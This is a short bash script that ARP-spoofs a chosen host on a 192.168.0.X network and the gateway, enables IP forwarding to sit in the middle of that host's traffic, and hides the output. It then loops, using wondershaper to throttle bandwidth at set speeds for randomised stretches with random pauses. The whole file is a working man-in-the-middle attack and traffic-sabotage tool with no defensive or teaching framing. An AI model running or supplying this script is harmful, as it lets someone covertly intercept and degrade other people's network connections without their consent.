#!/bin/bash

echo "IP adress of 192.168.0.X"
read IP
{
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.0.$IP 192.168.0.1 & arpspoof -i eth0 -t 192.168.0.1 192.168.0.$IP &
} &> /dev/null


while true
do

f=8
echo "Download speed in KB/s"
read DS
echo "Upload speed in KB/s"
read US
echo 'Set to '$(( DS * f ))' Kb/s D & '$(( US * f ))' Kb/s U or '$DS' KB/s D & '$US' KB/s U'
echo "Delay for seconds"
read Sec
sleep $Sec

sudo wondershaper eth0 $(( DS * f )) $(( US * f )) ; 
r=$[ ( $RANDOM % 20 )  + 1000 ]; echo Limiting for $r seconds; sleep $r
wondershaper clear eth0
r2=$[ ( $RANDOM % 60 )  + 5 ]; echo Sleeping for $r2 seconds; sleep $r2


done
